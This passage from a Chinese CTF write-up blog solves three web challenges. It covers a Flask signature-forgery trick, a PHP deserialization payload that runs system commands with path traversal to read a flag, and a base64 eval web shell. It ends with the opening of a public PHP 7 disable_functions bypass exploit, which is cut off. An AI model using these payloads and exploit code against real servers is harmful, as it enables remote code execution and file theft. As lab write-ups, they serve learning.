</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>resp</span> <span class=o>==</span> <span class=s2>&#34;Connection Timeout&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=n>result</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>resp</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=nb>print</span> <span class=n>resp</span>
</span></span><span class=line><span class=cl>                    <span class=n>tmpfile</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>resp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>tmpfile</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>                <span class=n>result</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>200</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s2>&#34;read&#34;</span> <span class=ow>in</span> <span class=bp>self</span><span class=o>.</span><span class=n>action</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;./</span><span class=si>%s</span><span class=s2>/result.txt&#34;</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>sandbox</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>result</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>200</span>
</span></span><span class=line><span class=cl>                <span class=n>result</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>result</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=mi>500</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>result</span><span class=p>[</span><span class=s1>&#39;data&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;Action Error&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span><span class=p>[</span><span class=s1>&#39;code&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>500</span>
</span></span><span class=line><span class=cl>            <span class=n>result</span><span class=p>[</span><span class=s1>&#39;msg&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;Sign Error&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>result</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>checkSign</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>getSign</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>action</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>param</span><span class=p>)</span> <span class=o>==</span> <span class=bp>self</span><span class=o>.</span><span class=n>sign</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># generate Sign For Action Scan.</span>
</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s2>&#34;/geneSign&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>geneSign</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>param</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>unquote</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;param&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>action</span> <span class=o>=</span> <span class=s2>&#34;scan&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>getSign</span><span class=p>(</span><span class=n>action</span><span class=p>,</span> <span class=n>param</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/De1ta&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>challenge</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>action</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>unquote</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;action&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>param</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>unquote</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;param&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sign</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>unquote</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>cookies</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;sign&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>ip</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>remote_addr</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>waf</span><span class=p>(</span><span class=n>param</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;No Hacker!!!!&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>task</span> <span class=o>=</span> <span class=n>Task</span><span class=p>(</span><span class=n>action</span><span class=p>,</span> <span class=n>param</span><span class=p>,</span> <span class=n>sign</span><span class=p>,</span> <span class=n>ip</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>task</span><span class=o>.</span><span class=n>Exec</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;code.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>scan</span><span class=p>(</span><span class=n>param</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>socket</span><span class=o>.</span><span class=n>setdefaulttimeout</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>urllib</span><span class=o>.</span><span class=n>urlopen</span><span class=p>(</span><span class=n>param</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()[:</span><span class=mi>50</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;Connection Timeout&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getSign</span><span class=p>(</span><span class=n>action</span><span class=p>,</span> <span class=n>param</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>secert_key</span> <span class=o>+</span> <span class=n>param</span> <span class=o>+</span> <span class=n>action</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>md5</span><span class=p>(</span><span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>content</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>waf</span><span class=p>(</span><span class=n>param</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>check</span> <span class=o>=</span> <span class=n>param</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>lower</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>check</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;gopher&#34;</span><span class=p>)</span> <span class=ow>or</span> <span class=n>check</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s2>&#34;file&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>debug</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>简单说明思路：</p><p>请求部分(代码69-78)：</p><table><thead><tr><th>获取的param是需要打开文件的名称，提示中已经写出flag在flag.txt。根据使用函数，可以使用get传参</th></tr></thead><tbody><tr><td>读取文件需要在cookie里传入参数action、sign</td></tr><tr><td>action是执行类型，代码33行和43行指出了两种。</td></tr><tr><td>sing是用来验证param和action的，相关函数在94行，稍后做解释</td></tr></tbody></table><p>获取sign部分(61-66)</p><table><thead><tr><th>获取param，action固定为scan</th></tr></thead><tbody><tr><td>返回(secert_key + param + action)组合的sign</td></tr></tbody></table><p>所以我们需要先获取sign，获取sign时包含的param和action，再去请求文件获得flag，并且获取flag时会验证sign是否符合格式(代码32行、54-58行)。因为获取sign时action固定为scan(代码65)，但是请求中我们需要使用read才可以访问，所以构造payload。</p><p>假如param=flag.txt，获取sign时action固定值为scan，此时的sign为(使用<code>|</code>仅为说明使用，其实字符串是相连的)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>secert_key|flag.txt|scan
</span></span></code></pre></td></tr></table></div></div><p>但是我们想要使用read，可以构造param为flag.txtread</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>secert_key|flag.txtread|scan
</span></span></code></pre></td></tr></table></div></div><p>再进行验证的时候我们传入param为flag.txt，action为readscan即可符合格式。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>secert_key|flag.txt|readscan
</span></span></code></pre></td></tr></table></div></div><p>请求/geneSign</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/geneSign?param=flag.txtread
</span></span></code></pre></td></tr></table></div></div><p>得到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>9017a8826b7267833f22c0f22d90fea7
</span></span></code></pre></td></tr></table></div></div><p>得到sign以后，再去访问/De1ta</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/De1ta?param=flag.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sign=9017a8826b7267833f22c0f22d90fea7;action=readscan;
</span></span></code></pre></td></tr></table></div></div><p>获得flag</p><hr><h1 id=网鼎杯-2020-朱雀组phpweb class=headerLink><a href=#%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e6%9c%b1%e9%9b%80%e7%bb%84phpweb class=header-mark></a>[网鼎杯 2020 朱雀组]phpweb</h1><p>看源码，有一个表单和自动提交的js。表单参数为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>func=date&amp;p=Y-m-d+h%3Ai%3As+a
</span></span></code></pre></td></tr></table></div></div><p>是一个获取时间的函数。尝试注入点func是函数，就试试常见的读取文件函数readfile可以读取index.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>    $disable_fun = array(&#34;exec&#34;,&#34;shell_exec&#34;,&#34;system&#34;,&#34;passthru&#34;,&#34;proc_open&#34;,&#34;show_source&#34;,&#34;phpinfo&#34;,&#34;popen&#34;,&#34;dl&#34;,&#34;eval&#34;,&#34;proc_terminate&#34;,&#34;touch&#34;,&#34;escapeshellcmd&#34;,&#34;escapeshellarg&#34;,&#34;assert&#34;,&#34;substr_replace&#34;,&#34;call_user_func_array&#34;,&#34;call_user_func&#34;,&#34;array_filter&#34;, &#34;array_walk&#34;,  &#34;array_map&#34;,&#34;registregister_shutdown_function&#34;,&#34;register_tick_function&#34;,&#34;filter_var&#34;, &#34;filter_var_array&#34;, &#34;uasort&#34;, &#34;uksort&#34;, &#34;array_reduce&#34;,&#34;array_walk&#34;, &#34;array_walk_recursive&#34;,&#34;pcntl_exec&#34;,&#34;fopen&#34;,&#34;fwrite&#34;,&#34;file_put_contents&#34;);
</span></span><span class=line><span class=cl>    function gettime($func, $p) {
</span></span><span class=line><span class=cl>        $result = call_user_func($func, $p);
</span></span><span class=line><span class=cl>        $a= gettype($result);
</span></span><span class=line><span class=cl>        if ($a == &#34;string&#34;) {
</span></span><span class=line><span class=cl>            return $result;
</span></span><span class=line><span class=cl>        } else {return &#34;&#34;;}
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    class Test {
</span></span><span class=line><span class=cl>        var $p = &#34;Y-m-d h:i:s a&#34;;
</span></span><span class=line><span class=cl>        var $func = &#34;date&#34;;
</span></span><span class=line><span class=cl>        function __destruct() {
</span></span><span class=line><span class=cl>            if ($this-&gt;func != &#34;&#34;) {
</span></span><span class=line><span class=cl>                echo gettime($this-&gt;func, $this-&gt;p);
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    $func = $_REQUEST[&#34;func&#34;];
</span></span><span class=line><span class=cl>    $p = $_REQUEST[&#34;p&#34;];
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    if ($func != null) {
</span></span><span class=line><span class=cl>        $func = strtolower($func);
</span></span><span class=line><span class=cl>        if (!in_array($func,$disable_fun)) {
</span></span><span class=line><span class=cl>            echo gettime($func, $p);
</span></span><span class=line><span class=cl>        }else {
</span></span><span class=line><span class=cl>            die(&#34;Hacker...&#34;);
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    ?&gt;
</span></span></code></pre></td></tr></table></div></div><p>我没思路了，看的网上wp。使用了反序列化unserialize，实在是太斯巴拉西了。</p><p>先构造Test对象，对象销毁时也会执行gettime函数执行payload，记得要加一层urlencode，不然会被拦下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>    class Test {
</span></span><span class=line><span class=cl>        var $p = &#34;ls ../../../../&#34;;
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        var $func = &#34;system&#34;;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>$s=new Test();
</span></span><span class=line><span class=cl>echo urlencode(serialize($s));
</span></span><span class=line><span class=cl>#unserialize
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A15%3A%22ls+..%2F..%2F..%2F..%2F%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D
</span></span></code></pre></td></tr></table></div></div><p>wp使用的是find指令找的flag地址，但是我执行以后出现503，应该是服务器防火墙阳气过盛，但是使用ls的方法一个一个找也能找得到。flag在/tmp/flagoefiu4r93</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST
</span></span><span class=line><span class=cl>func=unserialize&amp;p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A18%3A%22ls+..%2F..%2F..%2F..%2Ftmp%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D
</span></span></code></pre></td></tr></table></div></div><p>最后读文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>func=readfile&amp;p=../../../../tmp/flagoefiu4r93
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=gkctf2020checkin class=headerLink><a href=#gkctf2020checkin class=header-mark></a>[GKCTF2020]CheckIN</h1><p>是用base64解码执行代码，使用Ginkgo接收，GET、POST都可以</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>phpinfo();
</span></span><span class=line><span class=cl>cGhwaW5mbygpOw==
</span></span></code></pre></td></tr></table></div></div><p>查看php版本和disable_function，被禁用一大堆，包括好多命令执行函数</p><p>可以使用print_r()、var_dump()输出，scandir()看目录，file_get_contents()读文件内容。</p><p>scandir根目录查看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?Ginkgo=cHJpbnRfcihzY2FuZGlyKCcuLi8uLi8uLi8uLi8nKSk7
</span></span></code></pre></td></tr></table></div></div><p>又一个flag读不出来，但是还有一个readflag可以读出来，文件前缀是ELF，百度以后知道是linux的可执行文件</p><p>传码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>eval($_POST[1]);
</span></span><span class=line><span class=cl>ZXZhbCgkX1BPU1RbMV0pOw==
</span></span></code></pre></td></tr></table></div></div><p>蚁剑连接。但是system()被禁，只能使用disable_function绕过，之前有一道<a href=https://braindance.tk/2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/ target=_blank rel="noopener noreffer">RCE ME</a>也是用绕过，但是在这道题不管用了。在网上看wp知道了另一种，利用php7堆溢出触发，我修改了下payload部分(11行)：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)
</span></span><span class=line><span class=cl>#
</span></span><span class=line><span class=cl># Bug: https://bugs.php.net/bug.php?id=72530
</span></span><span class=line><span class=cl>#
</span></span><span class=line><span class=cl># This exploit should work on all PHP 7.0-7.3 versions
</span></span><span class=line><span class=cl>#
</span></span><span class=line><span class=cl># Author: https://github.com/mm0r1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pwn(&#34;../../.././readflag&#34;);   #这里是想要执行的命令
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>function pwn($cmd) {
</span></span><span class=line><span class=cl>    global $abc, $helper;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    function str2ptr(&amp;$str, $p = 0, $s = 8) {
</span></span><span class=line><span class=cl>        $address = 0;
</span></span><span class=line><span class=cl>        for($j = $s-1; $j &gt;= 0; $j--) {
